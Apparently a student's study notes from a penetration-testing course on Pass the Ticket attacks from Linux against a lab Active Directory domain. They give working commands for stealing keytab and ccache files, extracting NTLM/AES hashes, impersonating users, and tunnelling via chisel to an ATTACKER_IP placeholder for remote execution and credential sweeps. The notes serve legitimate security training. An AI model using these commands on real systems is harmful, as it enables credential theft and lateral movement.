# 🐧 Pass the Ticket (PtT) — Linux

> **Module Section:** 22 / 26 — Password Attacks

## Overview

Linux machines can be **domain-joined** to Active Directory for centralized identity management. When this is the case (or when scripts use Kerberos for automation), a compromised Linux host becomes a **source of Kerberos tickets** we can abuse to impersonate users and move laterally.

> 💡 A Linux machine does **not** need to be domain-joined to use Kerberos tickets — they may also live in keytab files used by scripts.

---

## Kerberos on Linux

Ticket request flow is identical to Windows. Storage differs.

### Two Main Artifacts

| Artifact | Location | Purpose |
|----------|----------|---------|
| **ccache file** | `/tmp/krb5cc_*` (default) | Holds active Kerberos credentials for a session |
| **keytab file** | Varies (`.keytab` extension common) | Principal + encrypted key pairs for passwordless auth |

### Key Environment Variable

```bash
KRB5CCNAME=FILE:/tmp/krb5cc_<uid>_<rand>
```

This variable points Kerberos-aware tools to the active ticket cache.

### Keytab Notes

- Allows scripts to authenticate **without storing passwords in cleartext**
- Can be created on one host and **copied to another**
- **Must be regenerated** when the user's password changes
- `/etc/krb5.keytab` — machine account keytab (readable only by root → impersonate `LINUX01$`)

---

## Scenario

- **Target:** `LINUX01` (reachable only through `MS01`)
- **Access:** Port forward — SSH `MS01:2222` → `LINUX01:22`
- **Creds given:** `david@inlanefreight.htb / Password2`

```bash
ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```

---

## 1️⃣ Identifying AD Integration

### `realm list` — Cleanest Check

```bash
david@linux01:~$ realm list
inlanefreight.htb
  type: kerberos
  configured: kerberos-member
  client-software: sssd
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

### Fallback: Check for SSSD / Winbind

```bash
ps -ef | grep -i "winbind\|sssd"
```

Presence of `sssd_be`, `sssd_nss`, or `winbindd` confirms AD integration.

---

## 2️⃣ Finding Kerberos Tickets

### A. Find Keytab Files

```bash
find / -name '*keytab*' -ls 2>/dev/null
```

Example output:
```
/etc/krb5.keytab                        (machine account — root only)
/opt/specialfiles/carlos.keytab         (service/user keytab)
```

> 💡 Keytabs might not always have `.keytab` extension. Check scripts referenced by **cronjobs** for keytab paths used with `kinit -k -t`:

```bash
crontab -l
# and
cat /path/to/script.sh
```

Typical pattern inside a script:

```bash
kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls' -k -no-pass
```

### B. Find ccache Files

```bash
env | grep -i krb5       # Find current user's cache
ls -la /tmp              # Find all users' caches
```

Default naming: `krb5cc_<uid>_<random>`

> 🔐 ccache permissions are `0600` — need **root** or **target user** to read others' caches.

---

## 3️⃣ Abusing Keytab Files

### Inspect a Keytab — `klist`

```bash
klist -k -t /opt/specialfiles/carlos.keytab
```

```
KVNO Timestamp           Principal
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

### Impersonate with `kinit`

```bash
# Backup your current ticket first!
cp "$KRB5CCNAME" /tmp/mybackup_ccache

# Impersonate Carlos using his keytab
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

# Verify
klist
```

> ⚠️ `kinit` is **case-sensitive** — username lowercase, realm uppercase.

### Use the Ticket

```bash
smbclient //dc01/carlos -k -c ls
```

---

## 4️⃣ Extracting Hashes from a Keytab

### `keytabextract.py`

Extracts **NTLM + AES128 + AES256** hashes from 502-type keytab files.

```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

```
REALM           : INLANEFREIGHT.HTB
SERVICE PRINCIPAL : carlos/
NTLM HASH       : a738f92b3c08b424ec2d99589a9cce60
AES-256 HASH    : 42ff0baa...
AES-128 HASH    : fa74d5abf4061baa1d4ff8485d1261c4
```

### What Can We Do With These?

| Hash | Attack |
|------|--------|
| **NTLM** | Pass the Hash / Crack with hashcat / crackstation.net |
| **AES-128 / AES-256** | OverPass the Hash (forge TGT with Rubeus) or crack |

> 💡 Keytab files can hold **multiple hashes for multiple users** (merged files).

### Quick Win — Crack NTLM

Upload NTLM hash to [crackstation.net](https://crackstation.net/). If it's a weak password, you get plaintext instantly.

```bash
su - carlos@inlanefreight.htb
```

---

## 5️⃣ Abusing ccache Files

### Requirements
- **Read access** to the ccache file (own it, or be root)
- Ticket must still be within `Valid starting` → `Expires` window

### Import a ccache — Just Set `KRB5CCNAME`

```bash
cp /tmp/krb5cc_647401106_I8I133 /root/
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist    # Confirms we are now 'julio'
smbclient //dc01/C$ -k -c ls -no-pass
```

### Check Group Membership Before Using

```bash
id julio@inlanefreight.htb
# groups=...domain admins@inlanefreight.htb...
```

Finding a **Domain Admin** ccache in `/tmp` is a critical finding.

---

## 6️⃣ Using Linux Tools with Kerberos from Attack Host

When attacking from a host **not joined to the domain** (e.g., Kali), we need:

1. **Network reachability** to KDC/DC
2. **DNS resolution** (or hardcoded `/etc/hosts`)
3. **Kerberos config** (`/etc/krb5.conf`)
4. A valid **ccache** pointed to by `KRB5CCNAME`

### Step 1 — Hardcode `/etc/hosts`

```
172.16.1.10 inlanefreight.htb inlanefreight dc01.inlanefreight.htb dc01
172.16.1.5  ms01.inlanefreight.htb ms01
```

### Step 2 — Tunnel via Chisel + Proxychains

`/etc/proxychains.conf`:
```
[ProxyList]
socks5 127.0.0.1 1080
```

On attack host (server side):
```bash
sudo ./chisel server --reverse
```

On MS01 (client side):
```cmd
C:\htb> c:\tools\chisel.exe client <ATTACKER_IP>:8080 R:socks
```

### Step 3 — Set the ccache

```bash
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

> 💡 Strip the `FILE:` prefix if present — some tools don't handle it.

### Step 4 — Use Tools with Kerberos (`-k`)

**Impacket:**
```bash
proxychains impacket-wmiexec dc01 -k
# If prompted for password, also add -no-pass
```

**Evil-WinRM:**
```bash
# First install the package
sudo apt-get install krb5-user -y
```

Set realm in `/etc/krb5.conf`:
```ini
[libdefaults]
    default_realm = INLANEFREIGHT.HTB
[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }
```

Then:
```bash
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

> ⚠️ Always use **hostnames** (e.g., `dc01`) not IPs — Kerberos auth requires the SPN to match.

---

## 7️⃣ Ticket Format Conversion

Move tickets between Linux and Windows formats.

### ccache ↔ kirbi

```bash
# Linux ccache → Windows kirbi
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

# Windows kirbi → Linux ccache
impacket-ticketConverter julio.kirbi krb5cc_julio
```

### Import Converted .kirbi on Windows

```cmd
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
C:\htb> klist
```

---

## 8️⃣ Linikatz — Mimikatz for Linux

**Linikatz** extracts credentials from Linux/AD integrations (FreeIPA, SSSD, Samba, Vintella, PBIS).

### Requirements
- **Root privileges**

### Run

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
chmod +x linikatz.sh
./linikatz.sh
```

### What It Collects

- Kerberos tickets (ccache + keytab)
- Machine account tickets from `/var/lib/sss/db/ccache_*`
- Cached hashes
- Samba secrets

Output saved to a folder named `linikatz.*` with all artifacts separated by format.

---

## Tool Reference

| Tool | Purpose |
|------|---------|
| `realm list` | Check AD integration |
| `klist` | View current tickets / keytab info |
| `klist -k -t <keytab>` | List principals inside a keytab |
| `kinit -k -t <keytab> <user>` | Import keytab into session |
| `keytabextract.py` | Dump NTLM/AES hashes from keytab |
| `impacket-ticketConverter` | Convert ccache ↔ kirbi |
| `impacket-wmiexec -k` | Command execution with ticket |
| `evil-winrm -r <realm>` | WinRM shell with ticket |
| `linikatz.sh` | Mimikatz-like credential sweep |

---

## Common Ticket Locations

| Path | What's There |
|------|--------------|
| `/tmp/krb5cc_*` | User ccache files |
| `/etc/krb5.keytab` | Machine account keytab (root only) |
| `/etc/krb5.conf` | Kerberos client config |
| `/var/lib/sss/db/ccache_*` | **SSSD machine ticket cache** (goldmine) |
| `$KRB5CCNAME` | Current session cache location |

---

## Key Takeaways

1. **Linux hosts can hold Kerberos tickets** — joined or standalone
2. Two artifact types: **ccache** (session tickets) + **keytab** (principal + key pairs)
3. `KRB5CCNAME` is the single most important environment variable to check
4. `realm list` or `ps -ef | grep sssd` confirms AD integration
5. **Keytabs** can yield NTLM + AES hashes via `keytabextract.py` → PtH / OverPass / crack
6. **ccache files** in `/tmp` require root or owner to read — escalate first
7. `kinit -k -t` imports a keytab into the session; `klist` confirms
8. **`id <user>`** to check group membership before committing to use a ticket
9. When attacking from outside the domain: **hardcode `/etc/hosts`**, tunnel with chisel, update `/etc/krb5.conf`, always use **hostnames**
10. **`impacket-ticketConverter`** moves tickets between Linux (ccache) and Windows (kirbi)
11. **Linikatz** = Mimikatz equivalent — sweep for all Kerberos artifacts when root
12. `/var/lib/sss/db/ccache_*` contains the **machine account TGT** — impersonate `LINUX01$`

---

## Exercise

*Add exercise answers here as you complete them*

---

## References

- [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [Linikatz (Cisco CX Security)](https://github.com/CiscoCXSecurity/linikatz)
- [Impacket](https://github.com/fortra/impacket)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [Chisel](https://github.com/jpillora/chisel)
- [Crackstation](https://crackstation.net/)
